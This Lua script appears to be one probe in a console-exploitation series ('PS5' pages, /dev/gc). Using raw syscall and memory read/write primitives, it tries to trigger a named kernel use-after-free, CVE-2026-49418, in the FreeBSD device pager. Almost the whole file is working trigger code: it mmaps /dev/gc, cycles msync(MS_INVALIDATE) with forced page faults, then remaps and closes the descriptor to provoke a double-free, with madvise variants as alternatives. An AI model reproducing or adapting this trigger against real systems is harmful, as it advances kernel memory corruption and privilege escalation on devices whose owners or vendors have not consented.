-- CRASH_CLASS: MODERATE
-- PROBE 67a: CVE-2026-49418 msync device pager UAF
--
-- Context: FreeBSD-SA-26:37.vm describes a use-after-free in the device pager.
-- When msync(MS_INVALIDATE) runs on a mapping of an unmanaged device object,
-- pages are marked invalid but stay on the pager's list. A later page fault
-- re-inserts them, corrupting the list. The page is freed twice when the
-- object is destroyed.
--
-- Gate: /dev/gc mmap at 0x310BD8000 (probe 66a) — device-backed mapping.
-- /dev/zero also mmaps but may use a different pager type.
-- This probe tests whether msync(MS_INVALIDATE) is reachable and whether
-- the page fault → re-insert → destroy sequence triggers the double-free.

print("=== PROBE 67a: CVE-2026-49418 MSYNC DEVICE PAGER UAF ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

local sc_getpid = make_syscall(20)
local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)
local sc_msync = make_syscall(227)
local sc_madvise = make_syscall(75)
local sc_mincore = make_syscall(78)

local function alive()
    local ok, v = pcall(function() return sc_getpid() end)
    return ok
end

local pid = to_num(sc_getpid())
print("PID: " .. pid)

local function write_str(str)
    local buf = memory.alloc(#str + 8)
    for i = 0, math.floor(#str / 4) do
        local dw = 0
        for j = 0, 3 do
            local idx = i * 4 + j + 1
            if idx <= #str then dw = dw + string.byte(str, idx) * (256 ^ j) end
        end
        safe_wd(buf + i * 4, dw)
    end
    return buf
end

local O_RDWR = 2
local O_NONBLOCK = 4
local PROT_RW = 3
local PROT_READ = 1
local MAP_SHARED = 1
local MAP_PRIVATE = 2
local MS_INVALIDATE = 2
local MS_SYNC = 0
local MS_ASYNC = 1
local MADV_DONTNEED = 4
local MADV_FREE = 5
local PAGE_SIZE = 0x4000  -- 16KB PS5 pages

-- [A] Test msync availability with a known-good mapping first
print("[A] msync availability test (shm)")
local sc_shm_open = make_syscall(482)
local sc_ftruncate = make_syscall(480)

-- Create shm object
local shm_name = write_str("/msync_test_67a")
local shm_fd = -1
repeat
    local ok, ret = pcall(function()
        return sc_shm_open(uint64(shm_name), uint64(0x602), uint64(0x1FF)) -- O_CREAT|O_RDWR|O_TRUNC, 0777
    end)
    shm_fd = ok and to_num(ret) or -1
    print("  shm_open = " .. shm_fd)
    if shm_fd < 0 then print("  shm_open FAILED") break end

    -- Truncate
    local tok, tret = pcall(function()
        return sc_ftruncate(uint64(shm_fd), uint64(PAGE_SIZE * 4))
    end)
    print("  ftruncate = " .. (tok and to_num(tret) or -999))

    -- mmap
    local mok, mret = pcall(function()
        return sc_mmap(uint64(0), uint64(PAGE_SIZE * 4), uint64(PROT_RW),
            uint64(MAP_SHARED), uint64(shm_fd), uint64(0))
    end)
    local maddr = mok and mret or nil
    print("  mmap = " .. hexval(maddr))
    if not maddr then break end

    -- Write sentinel
    safe_wd(maddr, 0xDEADBEEF)
    print("  wrote sentinel: " .. string.format("0x%08X", safe_rd(maddr) or 0))

    -- msync test
    local sync_ok, sync_ret = pcall(function()
        return sc_msync(uint64(maddr), uint64(PAGE_SIZE * 4), uint64(MS_SYNC))
    end)
    print("  msync(MS_SYNC) = " .. (sync_ok and to_num(sync_ret) or -999))

    local async_ok, async_ret = pcall(function()
        return sc_msync(uint64(maddr), uint64(PAGE_SIZE * 4), uint64(MS_ASYNC))
    end)
    print("  msync(MS_ASYNC) = " .. (async_ok and to_num(async_ret) or -999))

    local inv_ok, inv_ret = pcall(function()
        return sc_msync(uint64(maddr), uint64(PAGE_SIZE * 4), uint64(MS_INVALIDATE))
    end)
    print("  msync(MS_INVALIDATE) = " .. (inv_ok and to_num(inv_ret) or -999))
    if not alive() then print("  *** DEAD AFTER MS_INVALIDATE ON SHM ***") return end

    -- After invalidation, read should page-fault and re-fetch
    local post_val = safe_rd(maddr)
    print("  post-invalidate read = " .. string.format("0x%08X", post_val or 0))

    -- Cleanup
    pcall(function() sc_munmap(uint64(maddr), uint64(PAGE_SIZE * 4)) end)
    pcall(function() sc_close(uint64(shm_fd)) end)
until true

if not alive() then print("DEAD after section A") return end

-- [B] msync on /dev/gc mapping (the device-backed target)
print("")
print("[B] msync on /dev/gc (device pager)")
local gc_path = write_str("/dev/gc")
repeat
    local gc_ok, gc_ret = pcall(function()
        return sc_open(uint64(gc_path), uint64(O_RDWR + O_NONBLOCK), uint64(0))
    end)
    local gc_fd = gc_ok and to_num(gc_ret) or -1
    print("  open(/dev/gc) = " .. gc_fd)
    if gc_fd < 0 then print("  /dev/gc open FAILED") break end

    -- mmap the device
    local gc_mok, gc_mret = pcall(function()
        return sc_mmap(uint64(0), uint64(PAGE_SIZE), uint64(PROT_RW),
            uint64(MAP_SHARED), uint64(gc_fd), uint64(0))
    end)
    local gc_maddr = gc_mok and gc_mret or nil
    local gmh, gml = 0, 0
    if gc_maddr then gmh, gml = get_hi_lo(gc_maddr) end
    print("  mmap = " .. hexval(gc_maddr))
    if not gc_maddr or (gmh == 0xFFFFFFFF and gml == 0xFFFFFFFF) then
        print("  mmap FAILED")
        pcall(function() sc_close(uint64(gc_fd)) end)
        break
    end

    -- Read initial state
    print("  initial read:")
    for off = 0, 0x1C, 4 do
        local v = safe_rd(gc_maddr + off)
        print(string.format("    +%02X = %08X", off, v or 0))
    end

    -- Try msync(MS_INVALIDATE) — this is the CVE trigger
    print("")
    print("  msync(MS_INVALIDATE) on /dev/gc mapping...")
    local gi_ok, gi_ret = pcall(function()
        return sc_msync(uint64(gc_maddr), uint64(PAGE_SIZE), uint64(MS_INVALIDATE))
    end)
    print("  msync(MS_INVALIDATE) = " .. (gi_ok and to_num(gi_ret) or -999))
    if not alive() then print("  *** DEAD AFTER MS_INVALIDATE ON /dev/gc ***") return end

    -- Page fault: read after invalidation to trigger re-insert
    print("  post-invalidate read (page fault trigger):")
    local post_ok, post_v = pcall(function() return memory.read_dword(gc_maddr) end)
    if post_ok then
        print(string.format("    +00 = %08X", to_num(post_v)))
    else
        print("    READ FAILED (page fault crash?)")
    end
    if not alive() then print("  *** DEAD AFTER PAGE FAULT ***") return end

    -- [B2] Multi-round invalidate/fault cycle to trigger double-insertion
    print("")
    print("  [B2] Multi-round invalidate/fault cycle (5 rounds)")
    for round = 1, 5 do
        local ri_ok, ri_ret = pcall(function()
            return sc_msync(uint64(gc_maddr), uint64(PAGE_SIZE), uint64(MS_INVALIDATE))
        end)
        if not alive() then
            print(string.format("  *** DEAD IN ROUND %d AFTER INVALIDATE ***", round))
            return
        end

        -- Force page fault
        local rf_ok, rf_v = pcall(function() return memory.read_dword(gc_maddr) end)
        if not alive() then
            print(string.format("  *** DEAD IN ROUND %d AFTER FAULT ***", round))
            return
        end

        print(string.format("    round %d: msync=%d fault_read=%s",
            round,
            ri_ok and to_num(ri_ret) or -999,
            rf_ok and string.format("0x%08X", to_num(rf_v)) or "FAIL"))
    end

    -- [B3] Unmap, then remap to see if the list is corrupted
    print("")
    print("  [B3] Unmap + remap test")
    local um_ok, um_ret = pcall(function()
        return sc_munmap(uint64(gc_maddr), uint64(PAGE_SIZE))
    end)
    print("  munmap = " .. (um_ok and to_num(um_ret) or -999))
    if not alive() then print("  *** DEAD AFTER MUNMAP ***") return end

    -- Remap at a different offset
    local gc_mok2, gc_mret2 = pcall(function()
        return sc_mmap(uint64(0), uint64(PAGE_SIZE), uint64(PROT_RW),
            uint64(MAP_SHARED), uint64(gc_fd), uint64(0))
    end)
    local gc_maddr2 = gc_mok2 and gc_mret2 or nil
    print("  re-mmap = " .. hexval(gc_maddr2))

    -- [B4] Now close the fd — object destruction should trigger the double-free
    print("")
    print("  [B4] Close fd to trigger object destruction")
    local cl_ok, cl_ret = pcall(function()
        return sc_close(uint64(gc_fd))
    end)
    print("  close = " .. (cl_ok and to_num(cl_ret) or -999))
    if not alive() then print("  *** DEAD AFTER CLOSE (double-free triggered?) ***") return end

    -- If we're still alive, try to access the remap
    if gc_maddr2 then
        local post_close_ok, post_close_v = pcall(function()
            return memory.read_dword(gc_maddr2)
        end)
        print("  post-close read = " .. (post_close_ok and string.format("0x%08X", to_num(post_close_v)) or "FAIL"))
    end

until true

if not alive() then print("DEAD after section B") return end

-- [C] msync on /dev/zero mapping
print("")
print("[C] msync on /dev/zero (non-device pager comparison)")
local zero_path = write_str("/dev/zero")
repeat
    local z_ok, z_ret = pcall(function()
        return sc_open(uint64(zero_path), uint64(O_RDWR), uint64(0))
    end)
    local z_fd = z_ok and to_num(z_ret) or -1
    print("  open(/dev/zero) = " .. z_fd)
    if z_fd < 0 then break end

    local z_mok, z_mret = pcall(function()
        return sc_mmap(uint64(0), uint64(PAGE_SIZE), uint64(PROT_RW),
            uint64(MAP_PRIVATE), uint64(z_fd), uint64(0))
    end)
    local z_maddr = z_mok and z_mret or nil
    print("  mmap = " .. hexval(z_maddr))
    if not z_maddr then break end

    -- Write and invalidate
    safe_wd(z_maddr, 0xCAFE0001)
    local zi_ok, zi_ret = pcall(function()
        return sc_msync(uint64(z_maddr), uint64(PAGE_SIZE), uint64(MS_INVALIDATE))
    end)
    print("  msync(MS_INVALIDATE) = " .. (zi_ok and to_num(zi_ret) or -999))
    if not alive() then print("  *** DEAD ***") return end

    local zp = safe_rd(z_maddr)
    print("  post-invalidate read = " .. string.format("0x%08X", zp or 0))

    pcall(function() sc_munmap(uint64(z_maddr), uint64(PAGE_SIZE)) end)
    pcall(function() sc_close(uint64(z_fd)) end)
until true

if not alive() then print("DEAD after section C") return end

-- [D] madvise(MADV_DONTNEED) as alternative invalidation
print("")
print("[D] madvise(MADV_DONTNEED) on device mapping")
repeat
    local d_ok, d_ret = pcall(function()
        return sc_open(uint64(gc_path), uint64(O_RDWR + O_NONBLOCK), uint64(0))
    end)
    local d_fd = d_ok and to_num(d_ret) or -1
    if d_fd < 0 then print("  /dev/gc reopen FAILED") break end

    local d_mok, d_mret = pcall(function()
        return sc_mmap(uint64(0), uint64(PAGE_SIZE * 4), uint64(PROT_RW),
            uint64(MAP_SHARED), uint64(d_fd), uint64(0))
    end)
    local d_maddr = d_mok and d_mret or nil
    if not d_maddr then
        print("  mmap FAILED")
        pcall(function() sc_close(uint64(d_fd)) end)
        break
    end
    print("  mmap = " .. hexval(d_maddr))

    -- madvise
    local ma_ok, ma_ret = pcall(function()
        return sc_madvise(uint64(d_maddr), uint64(PAGE_SIZE * 4), uint64(MADV_DONTNEED))
    end)
    print("  madvise(MADV_DONTNEED) = " .. (ma_ok and to_num(ma_ret) or -999))
    if not alive() then print("  *** DEAD ***") return end

    -- Read to trigger fault
    local dp = safe_rd(d_maddr)
    print("  post-madvise read = " .. string.format("0x%08X", dp or 0))

    -- madvise(MADV_FREE) — another way to discard pages
    local mf_ok, mf_ret = pcall(function()
        return sc_madvise(uint64(d_maddr), uint64(PAGE_SIZE * 4), uint64(MADV_FREE))
    end)
    print("  madvise(MADV_FREE) = " .. (mf_ok and to_num(mf_ret) or -999))
    if not alive() then print("  *** DEAD ***") return end

    -- mincore — check page residency
    local mc_buf = memory.alloc(16)
    for i = 0, 12, 4 do safe_wd(mc_buf + i, 0) end
    local mc_ok, mc_ret = pcall(function()
        return sc_mincore(uint64(d_maddr), uint64(PAGE_SIZE * 4), uint64(mc_buf))
    end)
    print("  mincore = " .. (mc_ok and to_num(mc_ret) or -999))
    if mc_ok and to_num(mc_ret) == 0 then
        local mc_v = safe_rd(mc_buf) or 0
        print(string.format("    page flags: %02X %02X %02X %02X",
            mc_v % 256, math.floor(mc_v / 256) % 256,
            math.floor(mc_v / 65536) % 256, math.floor(mc_v / 16777216) % 256))
    end

    pcall(function() sc_munmap(uint64(d_maddr), uint64(PAGE_SIZE * 4)) end)
    pcall(function() sc_close(uint64(d_fd)) end)
until true

print("")
print("=== PROBE 67a COMPLETE ===")
